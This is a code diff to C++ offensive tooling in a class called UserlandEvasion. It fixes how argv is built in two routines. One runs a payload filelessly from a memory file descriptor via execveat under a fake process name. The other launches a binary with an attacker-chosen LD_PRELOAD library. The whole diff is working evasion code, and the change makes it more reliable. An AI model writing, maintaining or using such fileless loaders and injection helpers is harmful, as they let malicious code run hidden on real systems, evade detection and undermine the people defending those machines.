@@ -45,16 +45,22 @@ Result<pid_t> UserlandEvasion::execute_fileless(const std::string& payload_path,
     // 4. Fork and execute via execveat.
     pid_t child = fork();
     if (child == 0) {
-        // In child.
-        char* argv[args.size() + 2];
-        argv[0] = (char *)fake_name.c_str();
-        for (size_t i = 0; i < args.size(); i++) {
-            argv[i + 1] = (char *)args[i].c_str();
+        // In child - create persistent copies of strings for argv
+        std::vector<std::string> argv_strings;
+        argv_strings.push_back(fake_name);
+        for (const auto& arg : args) {
+            argv_strings.push_back(arg);
         }
-        argv[args.size() + 1] = NULL;
+
+        // Create argv array pointing to persistent strings
+        std::vector<char*> argv(argv_strings.size() + 1);
+        for (size_t i = 0; i < argv_strings.size(); i++) {
+            argv[i] = const_cast<char*>(argv_strings[i].c_str());
+        }
+        argv[argv_strings.size()] = NULL;
 
         // execveat(memfd, "", argv, environ, AT_EMPTY_PATH)
-        syscall(SYS_execveat, memfd, "", argv, environ, AT_EMPTY_PATH);
+        syscall(SYS_execveat, memfd, "", argv.data(), environ, AT_EMPTY_PATH);
         _exit(1);
     }
 
@@ -83,13 +89,22 @@ Result<pid_t> UserlandEvasion::execute_with_preload(const std::string& binary_pa
     pid_t child = fork();
     if (child == 0) {
         setenv("LD_PRELOAD", preload_lib_path.c_str(), 1);
-        char* argv[args.size() + 2];
-        argv[0] = (char *)binary_path.c_str();
-        for (size_t i = 0; i < args.size(); i++) {
-            argv[i + 1] = (char *)args[i].c_str();
+
+        // Create persistent copies of strings for argv
+        std::vector<std::string> argv_strings;
+        argv_strings.push_back(binary_path);
+        for (const auto& arg : args) {
+            argv_strings.push_back(arg);
         }
-        argv[args.size() + 1] = NULL;
-        execve(binary_path.c_str(), argv, environ);
+
+        // Create argv array pointing to persistent strings
+        std::vector<char*> argv(argv_strings.size() + 1);
+        for (size_t i = 0; i < argv_strings.size(); i++) {
+            argv[i] = const_cast<char*>(argv_strings[i].c_str());
+        }
+        argv[argv_strings.size()] = NULL;
+
+        execve(binary_path.c_str(), argv.data(), environ);
         _exit(1);
     }
     return Result<pid_t>(child);
